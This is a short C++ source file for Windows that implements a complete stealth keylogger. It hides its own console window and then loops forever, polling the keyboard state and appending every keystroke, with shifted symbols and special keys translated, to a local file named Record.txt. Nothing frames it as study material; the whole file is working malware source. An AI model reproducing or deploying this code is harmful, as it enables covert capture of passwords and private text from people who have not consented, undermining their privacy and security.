#include <windows.h>
#include <Winuser.h>
#include <fstream>
#include <iostream>

using namespace std;

void hide();
void log();

int main()
{
	hide();
	log();
	return 0;
}

void hide() {
	HWND stealth;
	AllocConsole();
	stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(stealth, 0);
}

void log() {
	char key;

	for (;;) {

		Sleep(0);
		for (key = 8; key < 222; key++) {
			if (GetAsyncKeyState(key) == -32767) {
				ofstream write("Record.txt", ios::app);

				if ((key > 64) && (key < 91) && !(GetAsyncKeyState(0x10))) { // is lower case alpha
					key += 32;
					write << key;
					write.close();
					break;
				}
				else if ((key > 64) && (key < 91)) { // is upper case alpha
					write << key;
					write.close();
					break;
				}
				else if (GetAsyncKeyState(0x10)) {
					switch (key) { // else its a special key with shift
					case 49: write << "!"; break;
					case 48: write << ")"; break;
					case 50: write << "@"; break;
					case 51: write << "#"; break;
					case 52: write << "$"; break;
					case 53: write << "%"; break;
					case 54: write << "^"; break;
					case 55: write << "&"; break;
					case 56: write << "*"; break;
					case 57: write << "("; break;
					default: write << key; break;
					}
				}
				else {
					switch (key) { // else its a special key no shift
					case 8: write << "<BackSpace>"; break;
					case VK_ESCAPE: write << "<Esc>"; break;
					case 49: write << "!"; break;
					//case 127: write << "<Del>"; break;
					case 32: write << " "; break;
					case 13: write << "<Enter>\n"; break;
					case VK_DELETE: write << "we used the special delete key"; break;
					default: write << key; break;
					}
				}
			}
		}
	}
}